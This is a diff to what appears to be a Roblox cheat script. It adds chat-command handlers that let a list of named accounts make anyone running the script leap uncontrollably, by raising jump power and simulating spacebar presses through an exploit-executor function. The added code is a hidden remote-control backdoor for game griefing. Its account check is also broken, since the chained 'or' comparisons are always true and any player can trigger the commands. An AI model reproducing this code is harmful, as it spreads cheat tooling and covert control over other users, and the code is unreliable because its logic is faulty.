@@ -1,3 +1,64 @@
+ TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX"  or "whyjustwhy2112" or "UnndarkfuI"  then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]rocket"
+then
+target = split[2]
+if target == "all" then 
+_G.Rocket = true
+else   
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Rocket = true
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX"  or "whyjustwhy2112" or "UnndarkfuI"  then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]unrocket"
+then
+target = split[2]
+if target == "all" then 
+_G.Rocket = false
+wait(1)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+else   
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Rocket = false
+wait(1)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end
+end
+end
+end
+end
+end
+end)
+end)
+
 
 
  TheUser = game:GetService("Players").LocalPlayer.Name
@@ -336,9 +397,65 @@ end)
 
 
 
+TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX"  or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]rocket"
+then
+target = split[2]
+if target == "all" then 
+_G.Rocket = true
+else   
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Rocket = true
+end
+end
+end
+end
+end
+end
+end)
+end
 
-
-
+ TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX"  or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]unrocket"
+then
+target = split[2]
+if target == "all" then 
+_G.Rocket = false
+wait(1)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+else   
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Rocket = false
+wait(1)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end
+end
+end
+end
+end
+end
+end)
+end
 
  TheUser = game:GetService("Players").LocalPlayer.Name
 for i,v in pairs(game.Players:GetChildren()) do
@@ -680,6 +797,8 @@ end)
 
 
 
+
+
 while wait(0.1) do
 if _G.Frozen == true then
 print("                    Froze")
@@ -688,3 +807,13 @@ game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
 
 end
 end
+
+
+while true do
+wait()
+if _G.Rocket == true then
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 700                 
+
+keypress(0x20)-- [color=#171717]0x20 = spacebar[/color]
+end
+end 
